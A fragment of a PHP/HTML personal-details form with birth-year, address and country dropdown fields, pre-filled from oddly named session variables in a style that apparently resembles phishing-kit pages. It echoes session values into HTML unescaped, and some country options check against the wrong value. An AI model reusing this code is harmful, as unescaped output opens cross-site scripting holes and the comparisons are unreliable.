	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1982") echo "selected"; } ?> value="1982">1982</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1981") echo "selected"; } ?> value="1981">1981</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1980") echo "selected"; } ?> value="1980">1980</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1979") echo "selected"; } ?> value="1979">1979</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1978") echo "selected"; } ?> value="1978">1978</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1977") echo "selected"; } ?> value="1977">1977</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1976") echo "selected"; } ?> value="1976">1976</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1975") echo "selected"; } ?> value="1975">1975</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1974") echo "selected"; } ?> value="1974">1974</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1973") echo "selected"; } ?> value="1973">1973</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1972") echo "selected"; } ?> value="1972">1972</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1971") echo "selected"; } ?> value="1971">1971</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1970") echo "selected"; } ?> value="1970">1970</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1969") echo "selected"; } ?> value="1969">1969</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1968") echo "selected"; } ?> value="1968">1968</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1967") echo "selected"; } ?> value="1967">1967</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1966") echo "selected"; } ?> value="1966">1966</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1965") echo "selected"; } ?> value="1965">1965</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1964") echo "selected"; } ?> value="1964">1964</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1963") echo "selected"; } ?> value="1963">1963</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1962") echo "selected"; } ?> value="1962">1962</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1961") echo "selected"; } ?> value="1961">1961</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1960") echo "selected"; } ?> value="1960">1960</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1959") echo "selected"; } ?> value="1959">1959</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1958") echo "selected"; } ?> value="1958">1958</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1957") echo "selected"; } ?> value="1957">1957</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1956") echo "selected"; } ?> value="1956">1956</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1955") echo "selected"; } ?> value="1955">1955</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1954") echo "selected"; } ?> value="1954">1954</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1953") echo "selected"; } ?> value="1953">1953</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1952") echo "selected"; } ?> value="1952">1952</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1951") echo "selected"; } ?> value="1951">1951</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1950") echo "selected"; } ?> value="1950">1950</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1949") echo "selected"; } ?> value="1949">1949</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1948") echo "selected"; } ?> value="1948">1948</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1947") echo "selected"; } ?> value="1947">1947</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1946") echo "selected"; } ?> value="1946">1946</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1945") echo "selected"; } ?> value="1945">1945</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1944") echo "selected"; } ?> value="1944">1944</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1943") echo "selected"; } ?> value="1943">1943</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1942") echo "selected"; } ?> value="1942">1942</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1941") echo "selected"; } ?> value="1941">1941</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1940") echo "selected"; } ?> value="1940">1940</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1939") echo "selected"; } ?> value="1939">1939</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1938") echo "selected"; } ?> value="1938">1938</option>
</select>

</div>
          </div>
          
          <div class="control-group">
          <label class="control-label" for="address1"><?php echo $ADDRESS_LINE_1_TXT; ?><span class="red">*</span></label>
          <div class="controls"><input type="text" class="input-xlarge" name="address1" id="address1" value="<?php if(isset($_SESSION['_adds1_'])){ echo $_SESSION['_adds1_'];} ?>" required  /></div>
          </div>
          
           <div class="control-group">
          <label class="control-label" for="address2"><?php echo $ADDRESS_LINE_2_TXT; ?></span></label>
          <div class="controls"><input type="text" class="input-xlarge" name="address2" id="address2" value="<?php if(isset($_SESSION['_adds2_'])){ echo $_SESSION['_adds2_'];} ?>" /></div>
          </div>
          
          <div class="control-group">
          <label class="control-label" for="country"><?php echo $COUNTRY_TXT; ?><span class="red">*</span></label>
          <div class="controls"><select class="input-medium" onchange="Frm1country(this.value)" name="country" id="country" required>
<option value="" <?php if($_SESSION['_count3s_']==""){ echo 'selected="selected"';}?> ><?php echo $COUNTRY_TXT; ?></option> 
<option value="Afghanistan" <?php if($_SESSION['_count3s_']=="Afghanistan"){ echo 'selected="selected"';}?> >Afghanistan</option> 
<option value="Albania" <?php if($_SESSION['_count3s_']=="Albania"){ echo 'selected="selected"';}?> >Albania</option> 
<option value="Algeria" <?php if($_SESSION['_count3s_']=="Algeria"){ echo 'selected="selected"';}?> >Algeria</option> 
<option value="American Samoa" <?php if($_SESSION['_count3s_']=="American Samoa"){ echo 'selected="selected"';}?> >American Samoa</option> 
<option value="Andorra" <?php if($_SESSION['_count3s_']=="Andorra"){ echo 'selected="selected"';}?> >Andorra</option> 
<option value="Angola" <?php if($_SESSION['_count3s_']=="Angola"){ echo 'selected="selected"';}?> >Angola</option> 
<option value="Anguilla" <?php if($_SESSION['_count3s_']=="Anguilla"){ echo 'selected="selected"';}?> >Anguilla</option> 
<option value="Antarctica" <?php if($_SESSION['_count3s_']=="Antarctica"){ echo 'selected="selected"';}?> >Antarctica</option> 
<option value="Antigua and Barbuda" <?php if($_SESSION['_count3s_']== "Antigua and Barbuda"){ echo 'selected="selected"';}?> >Antigua and Barbuda</option> 
<option value="Argentina" <?php if($_SESSION['_count3s_']=="Argentina"){ echo 'selected="selected"';}?> >Argentina</option> 
<option value="Armenia" <?php if($_SESSION['_count3s_']=="Armenia"){ echo 'selected="selected"';}?> >Armenia</option> 
<option value="Aruba" <?php if($_SESSION['_count3s_']=="Aruba"){ echo 'selected="selected"';}?> >Aruba</option> 
<option value="Australia" <?php if($_SESSION['_count3s_']=="Australia"){ echo 'selected="selected"';}?> >Australia</option> 
<option value="Austria" <?php if($_SESSION['_count3s_']=="Austria"){ echo 'selected="selected"';}?> >Austria</option> 
<option value="Azerbaijan" <?php if($_SESSION['_count3s_']=="Azerbaijan"){ echo 'selected="selected"';}?> >Azerbaijan</option> 
<option value="Bahamas" <?php if($_SESSION['_count3s_']=="Bahamas"){ echo 'selected="selected"';}?> >Bahamas</option> 
<option value="Bahrain" <?php if($_SESSION['_count3s_']=="Bahrain"){ echo 'selected="selected"';}?> >Bahrain</option> 
<option value="Bangladesh" <?php if($_SESSION['_count3s_']=="Bangladesh"){ echo 'selected="selected"';}?> >Bangladesh</option> 
<option value="Barbados" <?php if($_SESSION['_count3s_']=="Barbados"){ echo 'selected="selected"';}?> >Barbados</option> 
<option value="Belarus" <?php if($_SESSION['_count3s_']=="Belarus"){ echo 'selected="selected"';}?> >Belarus</option> 
<option value="Belgium" <?php if($_SESSION['_count3s_']=="Belgium"){ echo 'selected="selected"';}?> >Belgium</option> 
<option value="Belize" <?php if($_SESSION['_count3s_']=="Belize"){ echo 'selected="selected"';}?> >Belize</option> 
<option value="Benin" <?php if($_SESSION['_count3s_']=="Benin"){ echo 'selected="selected"';}?> >Benin</option> 
<option value="Bermuda" <?php if($_SESSION['_count3s_']=="Bermuda"){ echo 'selected="selected"';}?> >Bermuda</option> 
<option value="Bhutan" <?php if($_SESSION['_count3s_']=="Bhutan"){ echo 'selected="selected"';}?> >Bhutan</option> 
<option value="Bolivia" <?php if($_SESSION['_count3s_']=="Bolivia"){ echo 'selected="selected"';}?> >Bolivia</option> 
<option value="Bosnia and Herzegovina" <?php if($_SESSION['_count3s_']=="United"){ echo 'selected="selected"';}?> >Bosnia and Herzegovina</option> 
<option value="Botswana" <?php if($_SESSION['_count3s_']=="Bosnia and Herzegovina"){ echo 'selected="selected"';}?> >Botswana</option> 
<option value="Bouvet Island" <?php if($_SESSION['_count3s_']=="Bouvet Island"){ echo 'selected="selected"';}?> >Bouvet Island</option> 
<option value="Brazil" <?php if($_SESSION['_count3s_']=="Brazil"){ echo 'selected="selected"';}?> >Brazil</option> 
<option value="British Indian Ocean Territory" <?php if($_SESSION['_count3s_']=="British Indian Ocean Territory"){ echo 'selected="selected"';}?> >British Indian Ocean Territory</option> 
<option value="Brunei Darussalam" <?php if($_SESSION['_count3s_']=="Brunei Darussalam"){ echo 'selected="selected"';}?> >Brunei Darussalam</option> 
<option value="Bulgaria" <?php if($_SESSION['_count3s_']=="Bulgaria"){ echo 'selected="selected"';}?> >Bulgaria</option> 
<option value="Burkina Faso" <?php if($_SESSION['_count3s_']=="Burkina Faso"){ echo 'selected="selected"';}?> >Burkina Faso</option> 
<option value="Burundi" <?php if($_SESSION['_count3s_']=="Burundi"){ echo 'selected="selected"';}?> >Burundi</option> 
<option value="Cambodia" <?php if($_SESSION['_count3s_']=="Cambodia"){ echo 'selected="selected"';}?> >Cambodia</option> 
<option value="Cameroon" <?php if($_SESSION['_count3s_']=="Cameroon"){ echo 'selected="selected"';}?> >Cameroon</option> 
<option value="Canada" <?php if($_SESSION['_count3s_']=="Canada"){ echo 'selected="selected"';}?> >Canada</option> 
<option value="Cape Verde" <?php if($_SESSION['_count3s_']=="Cape Verde"){ echo 'selected="selected"';}?> >Cape Verde</option> 
<option value="Cayman Islands" <?php if($_SESSION['_count3s_']=="Cayman Islands"){ echo 'selected="selected"';}?> >Cayman Islands</option> 
<option value="Central African Republic" <?php if($_SESSION['_count3s_']=="Central African Republic"){ echo 'selected="selected"';}?> >Central African Republic</option> 
<option value="Chad" <?php if($_SESSION['_count3s_']=="Chad"){ echo 'selected="selected"';}?> >Chad</option> 
<option value="Chile" <?php if($_SESSION['_count3s_']=="Chile"){ echo 'selected="selected"';}?> >Chile</option> 
<option value="China" <?php if($_SESSION['_count3s_']=="China"){ echo 'selected="selected"';}?> >China</option> 
<option value="Christmas Island" <?php if($_SESSION['_count3s_']=="Christmas Island"){ echo 'selected="selected"';}?> >Christmas Island</option> 
<option value="Cocos (Keeling) Islands" <?php if($_SESSION['_count3s_']=="Cocos (Keeling) Islands"){ echo 'selected="selected"';}?> >Cocos (Keeling) Islands</option> 
<option value="Colombia" <?php if($_SESSION['_count3s_']=="Colombia"){ echo 'selected="selected"';}?> >Colombia</option> 
<option value="Comoros" <?php if($_SESSION['_count3s_']=="Comoros"){ echo 'selected="selected"';}?> >Comoros</option> 
<option value="Congo" <?php if($_SESSION['_count3s_']=="Congo"){ echo 'selected="selected"';}?> >Congo</option> 
<option value="Congo, The Democratic Republic of The" <?php if($_SESSION['_count3s_']=="Congo, The Democratic Republic of The"){ echo 'selected="selected"';}?> >Congo, The Democratic Republic of The</option> 
<option value="Cook Islands" <?php if($_SESSION['_count3s_']=="Cook Islands"){ echo 'selected="selected"';}?> >Cook Islands</option> 
<option value="Costa Rica" <?php if($_SESSION['_count3s_']=="Costa Rica"){ echo 'selected="selected"';}?> >Costa Rica</option> 
<option value="Cote D`ivoire" <?php if($_SESSION['_count3s_']=="Cote D`ivoire"){ echo 'selected="selected"';}?> >Cote D'ivoire</option> 
<option value="Croatia" <?php if($_SESSION['_count3s_']=="Croatia"){ echo 'selected="selected"';}?> >Croatia</option> 
<option value="Cuba" <?php if($_SESSION['_count3s_']=="Cuba"){ echo 'selected="selected"';}?> >Cuba</option> 
<option value="Cyprus" <?php if($_SESSION['_count3s_']=="Cyprus"){ echo 'selected="selected"';}?> >Cyprus</option> 
<option value="Czech Republic" <?php if($_SESSION['_count3s_']=="Czech Republic"){ echo 'selected="selected"';}?> >Czech Republic</option> 
<option value="Denmark" <?php if($_SESSION['_count3s_']=="Denmark"){ echo 'selected="selected"';}?> >Denmark</option> 
<option value="Djibouti" <?php if($_SESSION['_count3s_']=="Djibouti"){ echo 'selected="selected"';}?> >Djibouti</option> 
<option value="Dominica" <?php if($_SESSION['_count3s_']=="Dominica"){ echo 'selected="selected"';}?> >Dominica</option> 
<option value="Dominican Republic" <?php if($_SESSION['_count3s_']=="Dominican Republic"){ echo 'selected="selected"';}?> >Dominican Republic</option> 
<option value="Ecuador" <?php if($_SESSION['_count3s_']=="Ecuador"){ echo 'selected="selected"';}?> >Ecuador</option> 
<option value="Egypt" <?php if($_SESSION['_count3s_']=="Egypt"){ echo 'selected="selected"';}?> >Egypt</option> 
<option value="El Salvador" <?php if($_SESSION['_count3s_']=="El Salvador"){ echo 'selected="selected"';}?> >El Salvador</option> 
<option value="Equatorial Guinea" <?php if($_SESSION['_count3s_']=="Equatorial Guinea"){ echo 'selected="selected"';}?> >Equatorial Guinea</option> 
<option value="Eritrea" <?php if($_SESSION['_count3s_']=="Eritrea"){ echo 'selected="selected"';}?> >Eritrea</option> 
<option value="Estonia" <?php if($_SESSION['_count3s_']=="Estonia"){ echo 'selected="selected"';}?> >Estonia</option> 
<option value="Ethiopia" <?php if($_SESSION['_count3s_']=="Ethiopia"){ echo 'selected="selected"';}?> >Ethiopia</option> 
<option value="Falkland Islands (Malvinas)" <?php if($_SESSION['_count3s_']=="Falkland Islands (Malvinas)"){ echo 'selected="selected"';}?> >Falkland Islands (Malvinas)</option> 
<option value="Faroe Islands" <?php if($_SESSION['_count3s_']=="Faroe Islands"){ echo 'selected="selected"';}?> >Faroe Islands</option> 
<option value="Fiji" <?php if($_SESSION['_count3s_']=="Fiji"){ echo 'selected="selected"';}?> >Fiji</option> 
<option value="Finland" <?php if($_SESSION['_count3s_']=="Finland"){ echo 'selected="selected"';}?> >Finland</option> 
<option value="France" <?php if($_SESSION['_count3s_']=="France"){ echo 'selected="selected"';}?> >France</option> 
<option value="French Guiana" <?php if($_SESSION['_count3s_']=="French Guiana"){ echo 'selected="selected"';}?> >French Guiana</option> 
<option value="French Polynesia" <?php if($_SESSION['_count3s_']=="French Polynesia"){ echo 'selected="selected"';}?> >French Polynesia</option> 
<option value="French Southern Territories" <?php if($_SESSION['_count3s_']=="French Southern Territories"){ echo 'selected="selected"';}?> >French Southern Territories</option> 
<option value="Gabon" <?php if($_SESSION['_count3s_']=="Gabon"){ echo 'selected="selected"';}?> >Gabon</option> 
<option value="Gambia" <?php if($_SESSION['_count3s_']=="Gambia"){ echo 'selected="selected"';}?> >Gambia</option> 
<option value="Georgia" <?php if($_SESSION['_count3s_']=="Georgia"){ echo 'selected="selected"';}?> >Georgia</option> 
<option value="Germany" <?php if($_SESSION['_count3s_']=="Germany"){ echo 'selected="selected"';}?> >Germany</option> 
<option value="Ghana" <?php if($_SESSION['_count3s_']=="Ghana"){ echo 'selected="selected"';}?> >Ghana</option> 
<option value="Gibraltar" <?php if($_SESSION['_count3s_']=="Gibraltar"){ echo 'selected="selected"';}?> >Gibraltar</option> 
<option value="Greece" <?php if($_SESSION['_count3s_']=="Greece"){ echo 'selected="selected"';}?> >Greece</option> 
<option value="Greenland" <?php if($_SESSION['_count3s_']=="Greenland"){ echo 'selected="selected"';}?> >Greenland</option> 
<option value="Grenada" <?php if($_SESSION['_count3s_']=="Grenada"){ echo 'selected="selected"';}?> >Grenada</option> 
<option value="Guadeloupe" <?php if($_SESSION['_count3s_']=="Guadeloupe"){ echo 'selected="selected"';}?> >Guadeloupe</option> 
<option value="Guam" <?php if($_SESSION['_count3s_']=="Guam"){ echo 'selected="selected"';}?> >Guam</option> 
<option value="Guatemala" <?php if($_SESSION['_count3s_']=="Guatemala"){ echo 'selected="selected"';}?> >Guatemala</option> 
<option value="Guinea" <?php if($_SESSION['_count3s_']=="Guinea"){ echo 'selected="selected"';}?> >Guinea</option> 
<option value="Guinea-bissau" <?php if($_SESSION['_count3s_']=="Guinea-bissau"){ echo 'selected="selected"';}?> >Guinea-bissau</option> 
<option value="Guyana" <?php if($_SESSION['_count3s_']=="Guyana"){ echo 'selected="selected"';}?> >Guyana</option> 
<option value="Haiti" <?php if($_SESSION['_count3s_']=="Haiti"){ echo 'selected="selected"';}?> >Haiti</option> 
<option value="Heard Island and Mcdonald Islands" <?php if($_SESSION['_count3s_']=="Heard Island and Mcdonald Islands"){ echo 'selected="selected"';}?> >Heard Island and Mcdonald Islands</option> 
<option value="Holy See (Vatican City State)" <?php if($_SESSION['_count3s_']=="Holy See (Vatican City State)"){ echo 'selected="selected"';}?> >Holy See (Vatican City State)</option> 
<option value="Honduras" <?php if($_SESSION['_count3s_']=="Honduras"){ echo 'selected="selected"';}?> >Honduras</option> 
<option value="Hong Kong" <?php if($_SESSION['_count3s_']=="Hong Kong"){ echo 'selected="selected"';}?> >Hong Kong</option> 
<option value="Hungary" <?php if($_SESSION['_count3s_']=="Hungary"){ echo 'selected="selected"';}?> >Hungary</option> 
<option value="Iceland" <?php if($_SESSION['_count3s_']=="Iceland"){ echo 'selected="selected"';}?> >Iceland</option> 
<option value="India" <?php if($_SESSION['_count3s_']=="India"){ echo 'selected="selected"';}?> >India</option> 
<option value="Indonesia" <?php if($_SESSION['_count3s_']=="Indonesia"){ echo 'selected="selected"';}?> >Indonesia</option> 
<option value="Iran, Islamic Republic of" <?php if($_SESSION['_count3s_']=="Iran, Islamic Republic of"){ echo 'selected="selected"';}?> >Iran, Islamic Republic of</option> 
<option value="Iraq" <?php if($_SESSION['_count3s_']=="Iraq"){ echo 'selected="selected"';}?> >Iraq</option> 
<option value="Ireland" <?php if($_SESSION['_count3s_']=="Ireland"){ echo 'selected="selected"';}?> >Ireland</option> 
<option value="Israel" <?php if($_SESSION['_count3s_']=="Israel"){ echo 'selected="selected"';}?> >Israel</option> 
<option value="Italy" <?php if($_SESSION['_count3s_']=="Italy"){ echo 'selected="selected"';}?> >Italy</option> 
<option value="Jamaica" <?php if($_SESSION['_count3s_']=="Jamaica"){ echo 'selected="selected"';}?> >Jamaica</option> 
<option value="Japan" <?php if($_SESSION['_count3s_']=="Japan"){ echo 'selected="selected"';}?> >Japan</option> 
<option value="Jordan" <?php if($_SESSION['_count3s_']=="Jordan"){ echo 'selected="selected"';}?> >Jordan</option> 
<option value="Kazakhstan" <?php if($_SESSION['_count3s_']=="Kazakhstan"){ echo 'selected="selected"';}?> >Kazakhstan</option> 
<option value="Kenya" <?php if($_SESSION['_count3s_']=="Kenya"){ echo 'selected="selected"';}?> >Kenya</option> 
<option value="Kiribati" <?php if($_SESSION['_count3s_']=="Kiribati"){ echo 'selected="selected"';}?> >Kiribati</option> 
<option value="Korea, Democratic Peoples Republic of" <?php if($_SESSION['_count3s_']=="Korea, Democratic People's Republic of"){ echo 'selected="selected"';}?> >Korea, Democratic People's Republic of</option> 
<option value="Korea, Republic of" <?php if($_SESSION['_count3s_']=="Korea, Republic of"){ echo 'selected="selected"';}?> >Korea, Republic of</option> 
<option value="Kuwait" <?php if($_SESSION['_count3s_']=="Kuwait"){ echo 'selected="selected"';}?> >Kuwait</option> 
<option value="Kyrgyzstan" <?php if($_SESSION['_count3s_']=="Kyrgyzstan"){ echo 'selected="selected"';}?> >Kyrgyzstan</option> 
<option value="Lao Peoples Democratic Republic" <?php if($_SESSION['_count3s_']=="Lao People's Democratic Republic"){ echo 'selected="selected"';}?> >Lao People's Democratic Republic</option> 
<option value="Latvia" <?php if($_SESSION['_count3s_']=="Latvia"){ echo 'selected="selected"';}?> >Latvia</option> 
<option value="Lebanon" <?php if($_SESSION['_count3s_']=="Lebanon"){ echo 'selected="selected"';}?> >Lebanon</option> 
<option value="Lesotho" <?php if($_SESSION['_count3s_']=="Lesotho"){ echo 'selected="selected"';}?> >Lesotho</option> 
<option value="Liberia" <?php if($_SESSION['_count3s_']=="Liberia"){ echo 'selected="selected"';}?> >Liberia</option> 
<option value="Libyan Arab Jamahiriya" <?php if($_SESSION['_count3s_']=="Libyan Arab Jamahiriya"){ echo 'selected="selected"';}?> >Libyan Arab Jamahiriya</option> 
<option value="Liechtenstein" <?php if($_SESSION['_count3s_']=="Liechtenstein"){ echo 'selected="selected"';}?> >Liechtenstein</option> 
<option value="Lithuania" <?php if($_SESSION['_count3s_']=="Lithuania"){ echo 'selected="selected"';}?> >Lithuania</option> 
<option value="Luxembourg" <?php if($_SESSION['_count3s_']=="Luxembourg"){ echo 'selected="selected"';}?> >Luxembourg</option> 
<option value="Macao" <?php if($_SESSION['_count3s_']=="Macao"){ echo 'selected="selected"';}?> >Macao</option> 
<option value="Macedonia, The Former Yugoslav Republic of" <?php if($_SESSION['_count3s_']=="Macedonia, The Former Yugoslav Republic of"){ echo 'selected="selected"';}?> >Macedonia, The Former Yugoslav Republic of</option> 
<option value="Madagascar" <?php if($_SESSION['_count3s_']=="Madagascar"){ echo 'selected="selected"';}?> >Madagascar</option> 
<option value="Malawi" <?php if($_SESSION['_count3s_']=="Malawi"){ echo 'selected="selected"';}?> >Malawi</option> 
<option value="Malaysia" <?php if($_SESSION['_count3s_']=="Malaysia"){ echo 'selected="selected"';}?> >Malaysia</option> 
<option value="Maldives" <?php if($_SESSION['_count3s_']=="Maldives"){ echo 'selected="selected"';}?> >Maldives</option> 
<option value="Mali" <?php if($_SESSION['_count3s_']=="Mali"){ echo 'selected="selected"';}?> >Mali</option> 
<option value="Malta" <?php if($_SESSION['_count3s_']=="Malta"){ echo 'selected="selected"';}?> >Malta</option> 
<option value="Marshall Islands" <?php if($_SESSION['_count3s_']=="Marshall Islands"){ echo 'selected="selected"';}?> >Marshall Islands</option> 
<option value="Martinique" <?php if($_SESSION['_count3s_']=="Martinique"){ echo 'selected="selected"';}?> >Martinique</option> 
<option value="Mauritania" <?php if($_SESSION['_count3s_']=="Mauritania"){ echo 'selected="selected"';}?> >Mauritania</option> 
<option value="Mauritius" <?php if($_SESSION['_count3s_']=="Mauritius"){ echo 'selected="selected"';}?> >Mauritius</option> 
<option value="Mayotte" <?php if($_SESSION['_count3s_']=="Mayotte"){ echo 'selected="selected"';}?> >Mayotte</option> 
<option value="Mexico" <?php if($_SESSION['_count3s_']=="Mexico"){ echo 'selected="selected"';}?> >Mexico</option> 
<option value="Micronesia, Federated States of" <?php if($_SESSION['_count3s_']=="Micronesia, Federated States of"){ echo 'selected="selected"';}?> >Micronesia, Federated States of</option> 
<option value="Moldova, Republic of" <?php if($_SESSION['_count3s_']=="Moldova, Republic of"){ echo 'selected="selected"';}?> >Moldova, Republic of</option> 
<option value="Monaco" <?php if($_SESSION['_count3s_']=="Monaco"){ echo 'selected="selected"';}?> >Monaco</option> 
<option value="Mongolia" <?php if($_SESSION['_count3s_']=="Mongolia"){ echo 'selected="selected"';}?> >Mongolia</option> 
<option value="Montserrat" <?php if($_SESSION['_count3s_']=="Montserrat"){ echo 'selected="selected"';}?> >Montserrat</option> 
<option value="Morocco" <?php if($_SESSION['_count3s_']=="Morocco"){ echo 'selected="selected"';}?> >Morocco</option> 
<option value="Mozambique" <?php if($_SESSION['_count3s_']=="Mozambique"){ echo 'selected="selected"';}?> >Mozambique</option> 
<option value="Myanmar" <?php if($_SESSION['_count3s_']=="Myanmar"){ echo 'selected="selected"';}?> >Myanmar</option> 
<option value="Namibia" <?php if($_SESSION['_count3s_']=="Namibia"){ echo 'selected="selected"';}?> >Namibia</option> 
<option value="Nauru" <?php if($_SESSION['_count3s_']=="Nauru"){ echo 'selected="selected"';}?> >Nauru</option> 
<option value="Nepal" <?php if($_SESSION['_count3s_']=="Nepal"){ echo 'selected="selected"';}?> >Nepal</option> 
<option value="Netherlands" <?php if($_SESSION['_count3s_']=="Netherlands"){ echo 'selected="selected"';}?> >Netherlands</option> 
<option value="Netherlands Antilles" <?php if($_SESSION['_count3s_']=="Netherlands Antilles"){ echo 'selected="selected"';}?> >Netherlands Antilles</option> 
<option value="New Caledonia" <?php if($_SESSION['_count3s_']=="New Caledonia"){ echo 'selected="selected"';}?> >New Caledonia</option> 
<option value="New Zealand" <?php if($_SESSION['_count3s_']=="New Zealand"){ echo 'selected="selected"';}?> >New Zealand</option> 
<option value="Nicaragua" <?php if($_SESSION['_count3s_']=="Nicaragua"){ echo 'selected="selected"';}?> >Nicaragua</option> 
<option value="Niger" <?php if($_SESSION['_count3s_']=="Niger"){ echo 'selected="selected"';}?> >Niger</option> 
<option value="Nigeria" <?php if($_SESSION['_count3s_']=="Nigeria"){ echo 'selected="selected"';}?> >Nigeria</option> 
<option value="Niue" <?php if($_SESSION['_count3s_']=="Niue"){ echo 'selected="selected"';}?> >Niue</option> 
<option value="Norfolk Island" <?php if($_SESSION['_count3s_']=="Norfolk Island"){ echo 'selected="selected"';}?> >Norfolk Island</option> 
<option value="Northern Mariana Islands" <?php if($_SESSION['_count3s_']=="Northern Mariana Islands"){ echo 'selected="selected"';}?> >Northern Mariana Islands</option> 
<option value="Norway" <?php if($_SESSION['_count3s_']=="Norway"){ echo 'selected="selected"';}?> >Norway</option> 
<option value="Oman" <?php if($_SESSION['_count3s_']=="Oman"){ echo 'selected="selected"';}?> >Oman</option> 
<option value="Pakistan" <?php if($_SESSION['_count3s_']=="Pakistan"){ echo 'selected="selected"';}?> >Pakistan</option> 
<option value="Palau" <?php if($_SESSION['_count3s_']=="Palau"){ echo 'selected="selected"';}?> >Palau</option> 
<option value="Palestinian Territory, Occupied" <?php if($_SESSION['_count3s_']=="Palestinian Territory, Occupied"){ echo 'selected="selected"';}?> >Palestinian Territory, Occupied</option> 
<option value="Panama" <?php if($_SESSION['_count3s_']=="Panama"){ echo 'selected="selected"';}?> >Panama</option> 
<option value="Papua New Guinea" <?php if($_SESSION['_count3s_']=="Papua New Guinea"){ echo 'selected="selected"';}?> >Papua New Guinea</option> 
<option value="Paraguay" <?php if($_SESSION['_count3s_']=="Paraguay"){ echo 'selected="selected"';}?> >Paraguay</option> 
<option value="Peru" <?php if($_SESSION['_count3s_']=="Peru"){ echo 'selected="selected"';}?> >Peru</option> 
<option value="Philippines" <?php if($_SESSION['_count3s_']=="Philippines"){ echo 'selected="selected"';}?> >Philippines</option> 
<option value="Pitcairn" <?php if($_SESSION['_count3s_']=="Pitcairn"){ echo 'selected="selected"';}?> >Pitcairn</option> 
<option value="Poland" <?php if($_SESSION['_count3s_']=="Poland"){ echo 'selected="selected"';}?> >Poland</option> 
<option value="Portugal" <?php if($_SESSION['_count3s_']=="Portugal"){ echo 'selected="selected"';}?> >Portugal</option> 
<option value="Puerto Rico" <?php if($_SESSION['_count3s_']=="Puerto Rico"){ echo 'selected="selected"';}?> >Puerto Rico</option> 
<option value="Qatar" <?php if($_SESSION['_count3s_']=="Qatar"){ echo 'selected="selected"';}?> >Qatar</option> 
<option value="Reunion" <?php if($_SESSION['_count3s_']=="Reunion"){ echo 'selected="selected"';}?> >Reunion</option> 
<option value="Romania" <?php if($_SESSION['_count3s_']=="Romania"){ echo 'selected="selected"';}?> >Romania</option> 
<option value="Russian Federation" <?php if($_SESSION['_count3s_']=="Russian Federation"){ echo 'selected="selected"';}?> >Russian Federation</option> 
<option value="Rwanda" <?php if($_SESSION['_count3s_']=="Rwanda"){ echo 'selected="selected"';}?> >Rwanda</option> 
<option value="Saint Helena" <?php if($_SESSION['_count3s_']=="Saint Helena"){ echo 'selected="selected"';}?> >Saint Helena</option> 
